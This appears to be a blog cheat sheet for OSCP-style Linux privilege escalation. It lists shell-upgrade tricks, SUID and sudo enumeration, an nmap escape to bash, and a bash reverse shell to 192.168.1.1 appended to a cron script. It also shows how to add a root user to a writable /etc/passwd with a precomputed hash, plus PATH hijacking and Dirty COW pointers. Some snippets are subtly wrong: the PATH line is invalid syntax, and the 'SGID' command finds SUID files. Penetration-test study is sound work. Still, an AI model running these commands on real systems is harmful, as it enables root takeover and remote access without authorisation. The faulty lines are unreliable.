---
title: Linux Privilege Escalation
author: linatl
category: "OSCP"
date: "2021-03-23 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---



###### Tricks to improve a crappy shell
```
rlwrap
> rlwrap -r nc -nvlp 443

stty
> python -c 'import pty; pty.spawn("/bin/bash")'
next: CTRL + Z out of the shell. Then:
> stty raw -echo
> fg
Back in the shell, run:
> reset
> export SHELL=bash
> export TERM=xterm-256color
> stty rows <num> columns <cols>

More in-depth explanation and more tricks:
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
```

###### Sudo -l
```
List user privileges for sudo
> sudo -l

Find SUID binaries
> find / -perm -4000 2>/dev/null

finding SGID binaries:
> find / -perm -u=s 2>/dev/null

Nmap interactive
> sudo nmap --interactive
> nmap> !bash
```


###### crontabs
```
enumerating crontab:
> ls -al /etc/cron* /etc/at*
> cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/> dev/null | grep -v "^#"

Add a line to a file:
> echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> cleanup.sh
```

###### Writable /etc/passwd or /etc/shadow
```
Make the salt value of a password:
> openssl passwd -1 -salt ignite password
Add this line to /etc/passwd (get immediate root shell)
username:$1$ignite$tTBj87JPlfWJIFioYSmpC0:0:0:root:/root:/bin/bash
```

###### Path Hijacking
```
Add a value of a directory to path, put it in the front so this will be used first, before the real path of the service. Then you can make a malicious service with the same name in the added path, and that will run instead.

> path =/tmp:$PATH
> echo $PATH
```

###### GTFObins
```
https://gtfobins.github.io/
```


###### Compiling C Exploits
```
> gcc exploit.c -o exploit
Installing gcc libraries for cross compiling
> sudo apt-get install gcc-multilib
> gcc -m32 -Wall exploit.c -o exploit
```

###### Dirtyc0w
```
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
Note: the /proc/self/mem file is not writable on some RHEL/CentOS versions.
```
